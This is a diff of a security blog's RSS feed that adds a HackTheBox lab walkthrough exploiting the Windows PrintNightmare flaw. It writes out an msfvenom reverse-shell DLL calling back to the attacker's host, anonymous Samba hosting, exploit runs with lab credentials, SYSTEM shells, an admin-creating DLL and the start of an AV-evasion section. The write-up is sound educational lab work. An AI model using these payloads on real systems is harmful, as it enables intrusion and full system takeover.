@@ -1,11 +1,11 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
-    <title>Printer Exploitation on Ef&#39;s log</title>
-    <link>https://fahmifj.github.io/series/printer-exploitation/</link>
-    <description>Recent content in Printer Exploitation on Ef&#39;s log</description>
+    <title>Hacking Printers on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/series/hacking-printers/</link>
+    <description>Recent content in Hacking Printers on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Sun, 24 Oct 2021 09:12:47 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/series/printer-exploitation/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 24 Oct 2021 09:12:47 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/series/hacking-printers/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HackTheBox - Return</title>
       <link>https://fahmifj.github.io/hackthebox/return/</link>
@@ -752,6 +752,399 @@ lp         <span class="m">27338</span>  0.0  0.0   <span class="m">8500</span> 
 lp@antique:/home/lp$ curl -s localhost:631/admin/log/error_log
 5d6d4...<span class="o">[</span>SNIP<span class="o">]</span>...
 </code></pre></div>]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>Play with PrintNightmare using HackTheBox machines</title>
+      <link>https://fahmifj.github.io/blog/play-with-printnightmare/</link>
+      <pubDate>Sat, 17 Jul 2021 13:52:01 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/blog/play-with-printnightmare/</guid>
+      <description>Having fun with a Zero-Day vulnerability</description>
+      <content:encoded><![CDATA[<p>A lot of InfoSec pros I follow on Twitter have been <em>tweeting</em> about a remote code execution vulnerability in the Windows Print Spooler service that could be used for privilege escalation and furthermore, it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to the vulnerability, which is now publicly known as PrintNightmare.  This vulnerability was accidentally disclosed by security researchers from China, Zhiniang Peng and Xuefeng Li, after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Print Spooler service. The researchers thought their finding was CVE-2021-1675, but it turned out to be different.</p>
+<p>I’m neither an expert nor an infosec pro, so I won’t dive into any technical thing about the vulnerability. In this post, I just want to play with the vulnerability using <a href="http://hackthebox.eu/">HackTheBox</a> <a href="https://www.hackthebox.eu/newsroom/htb-take-it-easy-july-2021">retired machines</a> as targets.</p>
+<h2 id="preparation">Preparation</h2>
+<p>There are several PoC exploits out there for PrintNightmare, but I will use the one that created by <a href="https://www.hackthebox.eu/profile/9164">Cube0x0</a>. To use the exploit, I will have to change my impacket version to the one that has been modified by Cube0x0.  But, changing the currently installed Impacket could potentially mess up my Kali. Therefore, I will use a Python virtual environment using <code>virtualenv</code> module. If I don&rsquo;t have it, I can run the following command to install the module.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ python3 -m pip install virtualenv
+</code></pre></div><p>The exploit also requires a DLL for later to be loaded on the target machines. This DLL will be hosted on a Samba server, and it must be configured to allow anonymous access, so that the exploit can directly grab the DLL .</p>
+<p>That said, I have some preparations to do.</p>
+<h4 id="working-directory">Working Directory</h4>
+<p>The first one is a working directory/folder, which I will create one under <code>/opt</code> called <code>printnightmare</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «opt» «10.10.14.75» 
+$ mkdir printnightmare <span class="o">&amp;&amp;</span> <span class="nb">cd</span> printnightmare
+</code></pre></div><p>Inside the <code>printnightmare</code>, I will clone the cube0x0 impacket as well as the exploit (<code>CVE-2021-1675-cube0x0</code>).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ git clone https://github.com/cube0x0/impacket <span class="o">&amp;&amp;</span> git clone https://github.com/cube0x0/CVE-2021-1675.git CVE-2021-1675-cube0x0
+</code></pre></div><p>Next, I will create a virtual environment called  <code>impacket-venv</code> using <code>virtualenv</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ virtualenv impacket-venv
+created virtual environment CPython3.9.2.final.0-64 in 614ms
+  creator CPython3Posix<span class="o">(</span><span class="nv">dest</span><span class="o">=</span>/opt/printnightmare/impacket-venv, <span class="nv">clear</span><span class="o">=</span>False, <span class="nv">no_vcs_ignore</span><span class="o">=</span>False, <span class="nv">global</span><span class="o">=</span>False<span class="o">)</span>
+  seeder FromAppData<span class="o">(</span><span class="nv">download</span><span class="o">=</span>False, <span class="nv">pip</span><span class="o">=</span>bundle, <span class="nv">setuptools</span><span class="o">=</span>bundle, <span class="nv">wheel</span><span class="o">=</span>bundle, <span class="nv">via</span><span class="o">=</span>copy, <span class="nv">app_data_dir</span><span class="o">=</span>/home/kali/.local/share/virtualenv<span class="o">)</span>
+    added seed packages: <span class="nv">pip</span><span class="o">==</span>21.1.3, <span class="nv">setuptools</span><span class="o">==</span>57.1.0, <span class="nv">wheel</span><span class="o">==</span>0.36.2
+  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
+</code></pre></div><p>Then, I will activate the virtual environment with the following commands.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ <span class="nb">source</span> impacket-venv/bin/activate
+</code></pre></div><p>Now I can just install the cube0x0 impacket.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ <span class="nb">cd</span> impacket <span class="o">&amp;&amp;</span> python3 setup.py install
+running install
+running bdist_egg
+running egg_info
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h4 id="dll-payload">DLL Payload</h4>
+<p>Before generating a DLL, I will create a <code>dll</code> folder first under the <code>printnightmare</code> folder.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ mkdir dll
+</code></pre></div><p>I will be using <code>msfvenom</code> to generate the DLL . Upon a successful exploitation, this DLL will connect back to my attacking machine on port 4444, in short, it&rsquo;s a reverse shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «dll» «10.10.14.75» 
+$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.75 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll &gt; revshell.dll  
+<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: <span class="m">460</span> bytes
+Final size of dll file: <span class="m">8704</span> bytes
+</code></pre></div><blockquote>
+<p>If you want to compile your own, go <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">here</a> or see <a href="#troubleshoot">Troubleshoot</a></p>
+</blockquote>
+<h4 id="samba-server-configuration">Samba Server Configuration</h4>
+<p>In the exploit repo, cube0x0 also provides a guide on how to configure a Samba server for hosting the DLL payload. I will follow cube0x0&rsquo;s guide, but I will add some additional lines for logging.</p>
+<p>First, I will create a backup of the original Samba configuration file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ sudo cp /etc/samba/smb.conf<span class="o">{</span>,.bak<span class="o">}</span>
+</code></pre></div><p>Then I will replace the entire <code>smb.conf</code> contents with the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">[global]
+   server role = standalone server
+   smb ports = 445
+   map to guest = bad user
+   usershare allow guests = yes
+   idmap config * : backend = tdb
+   log file = /var/log/samba/log.%m
+   max log size = 1000
+   logging = file
+   
+[ef]
+    comment = Samba
+    path = /opt/printnightmare/dll
+    guest ok = yes
+    read only = no
+    browsable = yes
+</code></pre></div><p>Lastly, I will start the Samba service.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ sudo systemctl start smbd 
+</code></pre></div><h2 id="target-machines">Target Machines</h2>
+<p>As stated previously, I will be using HackTheBox retired machines as the targets. Here are the retired Windows machines that I will use along with their low privilege users.</p>
+<div class="table-wrapper" >
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Target</th>
+<th style="text-align:center">IP</th>
+<th style="text-align:center">Low Priv Credentials [username:password]</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Active</td>
+<td style="text-align:center">10.10.10.100</td>
+<td style="text-align:center"><code>svc_tgs:GPPstillStandingStrong2k18</code></td>
+</tr>
+<tr>
+<td style="text-align:center">Bastion</td>
+<td style="text-align:center">10.10.10.134</td>
+<td style="text-align:center"><code>l4mpje:bureaulampje</code></td>
+</tr>
+<tr>
+<td style="text-align:center">Heist</td>
+<td style="text-align:center">10.10.10.149</td>
+<td style="text-align:center"><code>hazard:stealth1agent</code></td>
+</tr>
+<tr>
+<td style="text-align:center">Forest</td>
+<td style="text-align:center">10.10.10.161</td>
+<td style="text-align:center"><code>svc-alfresco:s3rvice</code></td>
+</tr>
+<tr>
+<td style="text-align:center">Atom</td>
+<td style="text-align:center">10.10.10.237</td>
+<td style="text-align:center"><code>jason:kidvscat_electron_@123</code></td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="target-scanning">Target Scanning</h2>
+<p>According to <a href="https://www.splunk.com/en_us/blog/security/i-pity-the-spool-detecting-printnightmare-cve-2021-34527.html">this blog post</a> by Splunk Threat Researcher Team, there are three prerequisites for successful exploitation of PrintNightmare:</p>
+<ol>
+<li>Print Spooler Service enabled on the target system ❔</li>
+<li>Network connectivity to the target system (initial access has been obtained)  ✔</li>
+<li>Hash or password for a low privileged user (or computer) account  ✔</li>
+</ol>
+<p>Now to check if the Print Spooler service enabled, I could follow cube0x0&rsquo;s instruction by using a tool from impacket called <code>rpcdump.py</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ rpcdump.py @<span class="o">[</span>IP-ADDRESS<span class="o">]</span> <span class="p">|</span> egrep <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
+</code></pre></div><p><code>rpcclient</code> can also be used to detect the availability of Print Spooler service by invoking <code>enumprinters</code> command. If the returned output is <strong>&ldquo;Could not initialise spoolss&rdquo;</strong>, then the Print Spooler is most likely to be disabled.</p>
+<p>The following is a dirty bash script I created as a wrapper for checking via <code>rpcdump.py</code> and <code>rpcclient</code> in one run.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
+</span><span class="cp"></span>
+<span class="nv">targets</span><span class="o">=</span><span class="nv">$1</span>
+
+<span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$targets</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+  <span class="nb">echo</span> <span class="s2">&#34;[-] Usage\t: </span><span class="nv">$0</span><span class="s2"> [Target file]&#34;</span> 
+  <span class="nb">echo</span> <span class="s2">&#34;[-] File format : &lt;ip&gt;:&lt;username&gt;:&lt;password&gt; | 127.0.0.1:foo:bar&#34;</span>
+  <span class="k">else</span>
+	<span class="k">for</span> target in <span class="sb">`</span>cat <span class="nv">$targets</span><span class="sb">`</span><span class="p">;</span> <span class="k">do</span>
+		 <span class="nv">ip</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f1<span class="k">)</span>
+		 <span class="nv">username</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f2<span class="k">)</span>
+		 <span class="nv">password</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f3<span class="k">)</span>
+		 <span class="nb">echo</span>  <span class="s2">&#34; - [</span><span class="nv">$ip</span><span class="s2">] - &#34;</span> 
+		 impacket-rpcdump <span class="nv">$ip</span> <span class="p">|</span> egrep <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
+		 rpcclient -U <span class="s2">&#34;</span><span class="nv">$username</span><span class="s2">%</span><span class="nv">$password</span><span class="s2">&#34;</span> <span class="nv">$ip</span> -c <span class="s2">&#34;enumprinters;quit&#34;</span>
+	<span class="k">done</span>
+<span class="k">fi</span>
+</code></pre></div><p>I saved the script as <code>detect-nightmare.sh</code> . I ran the script and it returned the following results.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ ./detect-nightmare.sh target-machines
+ - <span class="o">[</span>10.10.10.100<span class="o">]</span> - 
+Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
+Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
+ - <span class="o">[</span>10.10.10.134<span class="o">]</span> - 
+Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
+Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
+No printers returned.
+ - <span class="o">[</span>10.10.10.149<span class="o">]</span> - 
+Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
+Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
+No printers returned.
+ - <span class="o">[</span>10.10.10.161<span class="o">]</span> - 
+Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
+ - <span class="o">[</span>10.10.10.237<span class="o">]</span> - 
+Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
+Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
+No printers returned.
+</code></pre></div><p>Based on the results above, Active and Forest don&rsquo;t seem to be vulnerable, but I will still test them out!</p>
+<h2 id="exploitation-demo">Exploitation Demo</h2>
+<h3 id="101010100-active">[10.10.10.100] Active</h3>
+<p>As expected, on Active the exploit is failed.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
+$ python3 CVE-2021-1675.py active.htb/SVC_TGS:<span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span>@10.10.10.100 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
+<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.100<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span> Connection Failed
+</code></pre></div><h3 id="101010134-bastion">[10.10.10.134] Bastion</h3>
+<p>I ran the exploit against Bastion, and it connected but then the DLL got removed by AV 😂. I will re-exploit this in the <a href="#av-evasion">Troubleshoot</a> section</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
+$ python3 CVE-2021-1675.py Bastion/l4mpje:<span class="s1">&#39;bureaulampje&#39;</span>@10.10.10.134 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
+<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.134<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
+<span class="o">[</span>+<span class="o">]</span> Bind OK
+<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_1734185bdb8f8610<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
+<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
+<span class="o">[</span>*<span class="o">]</span> Try 1...
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0xe1 - ERROR_VIRUS_INFECTED - Operation did not <span class="nb">complete</span> successfully because the file contains a virus or potentially unwanted software
+</code></pre></div><h3 id="101010134-heist">[10.10.10.134] Heist</h3>
+<p>On Heist, the exploit didn&rsquo;t show any indication of a successful exploitation (I will look into this problem at <a href="#troubleshoot">Troubleshoot</a>).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
+$ python3 CVE-2021-1675.py heist/hazard:<span class="s1">&#39;stealth1agent&#39;</span>@10.10.10.149 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
+<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.149<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
+<span class="o">[</span>+<span class="o">]</span> Bind OK
+<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_83aa9aebf5dffc96<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
+<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
+<span class="o">[</span>*<span class="o">]</span> Try 1...
+<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
+<span class="o">[</span>*<span class="o">]</span> Try 2...
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span class="o">(</span>The specified named pipe is in the closing state.<span class="o">)</span>
+</code></pre></div><p>But strangely, I got a shell on my listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ nc -nvlp <span class="m">4444</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+connect to <span class="o">[</span>10.10.14.75<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.149<span class="o">]</span> <span class="m">49700</span>
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.437<span class="o">]</span>
+<span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+whoami
+nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;hostname
+hostname
+SupportDesk
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : dead:beef::c138:bcba:454d:8b9c
+   Link-local IPv6 Address . . . . . : fe80::c138:bcba:454d:8b9c%15
+   IPv4 Address. . . . . . . . . . . : 10.10.10.149
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
+                                       10.10.10.2
+</code></pre></div><h3 id="101010161-forest">[10.10.10.161] Forest</h3>
+<p>Like on Active, the exploit also failed on Forest</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
+$ python3 CVE-2021-1675.py htb.local/svc-alfresco:<span class="s1">&#39;s3rvice&#39;</span>@10.10.10.161 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
+<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.161<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span> Connection Failed
+</code></pre></div><h3 id="101010237-atom">[10.10.10.237] Atom</h3>
+<p>On Atom, the exploit returned the same result as on Heist, no indication of a successful exploitation.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
+$ python3 CVE-2021-1675.py ATOM/jason:<span class="s1">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
+<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.237<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
+<span class="o">[</span>+<span class="o">]</span> Bind OK
+<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_c62e9f8067f98247<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
+<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
+<span class="o">[</span>*<span class="o">]</span> Try 1...
+<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
+<span class="o">[</span>*<span class="o">]</span> Try 2...
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span class="o">(</span>The specified named pipe is in the closing state.<span class="o">)</span>
+</code></pre></div><p>But then the DLL connected to my listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ nc -nvlp <span class="m">4444</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+connect to <span class="o">[</span>10.10.14.75<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">62322</span>
+Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
+<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
+whoami
+nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;hostname
+hostname
+ATOM
+
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : dead:beef::6036:234d:b46e:b7d
+   Temporary IPv6 Address. . . . . . : dead:beef::6193:2da2:279d:6fea
+   Temporary IPv6 Address. . . . . . : dead:beef::94cf:8412:6dc6:a8ed
+   Link-local IPv6 Address . . . . . : fe80::6036:234d:b46e:b7d%6
+   IPv4 Address. . . . . . . . . . . : 10.10.10.237
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
+                                       10.10.10.2
+</code></pre></div><h2 id="troubleshoot">Troubleshoot</h2>
+<h4 id="status_pipe_closing">STATUS_PIPE_CLOSING</h4>
+<p>I&rsquo;m sure that the following error is caused by my DLL payload.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.)
+</code></pre></div><p>This is probably because, instead of using the DLL to create a user (one time load / execution / thread / I don&rsquo;t know~), I use the DLL for reverse shell.</p>
+<p><del>I wanted to generate my own payload to test but my Visual Studio somehow didn&rsquo;t want me to install the Windows SDK</del>  (Fixed on <a href="https://fahmifj.github.io/blog/windows-10-troubleshoot-permissions/">this post</a>).</p>
+<p>Because I don&rsquo;t want to RE the DLL created with msfvenom, I steal <a href="https://github.com/fahmifj/PrintNightmare-kit/blob/main/generate-nightmaredll.ps1">this payload</a> from this <a href="https://github.com/calebstewart/CVE-2021-1675">PoC</a> created by Caleb Stewart and John Hammond.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS /opt/PrintNightmare/dll&gt; Import-Module ./generate-nightmaredll.ps1
+PS /opt/PrintNightmare/dll&gt; Get-NightmareDLL
+<span class="o">[</span>+<span class="o">]</span> Created payload at /opt/printnightmare/dll/nightmare.dll
+</code></pre></div><p>I ran the exploit again on Atom, but this time it didn&rsquo;t crash, instead it showed the indication of a successful exploitation.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> ✗ 
+$ python3 CVE-2021-1675.py ATOM/jason:<span class="s1">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class="s1">&#39;\\10.10.14.75\ef\nightmare.dll&#39;</span>
+<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.237<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
+<span class="o">[</span>+<span class="o">]</span> Bind OK
+<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_c62e9f8067f98247<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
+<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\n</span>ightmare.dll
+<span class="o">[</span>*<span class="o">]</span> Try 1...
+<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
+<span class="o">[</span>*<span class="o">]</span> Try 2...
+<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
+<span class="o">[</span>*<span class="o">]</span> Stage2: <span class="m">0</span>
+<span class="o">[</span>+<span class="o">]</span> Exploit Completed
+</code></pre></div><p>Now I can login with credentials of  <code>adm1n:P@ssw0rd</code> (default credentials from the stolen DLL) using <code>evil-winrm</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «dll» «10.10.14.75» 
+$ evil-winrm -i 10.10.10.237 -u <span class="s1">&#39;adm1n&#39;</span> -p <span class="s1">&#39;P@ssw0rd&#39;</span>                                                       
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; whoami /groups <span class="p">|</span> <span class="k">select</span>-string <span class="s2">&#34;Administrators&#34;</span>
+
+NT AUTHORITY<span class="se">\L</span>ocal account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\A</span>dministrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
+
+
+*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; hostname
+ATOM
+</code></pre></div><h4 id="av-evasion">AV Evasion</h4>
+<p>Another issue I ran into during the demo was that the payload got removed by Microsoft Defender on Bastion. Using a self compile DLL payload from <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">BookHackTrick</a> DLL templates can resolve this  (I should do this earlier 😅🔨).</p>
+<p>The following is the template that I use.</p>
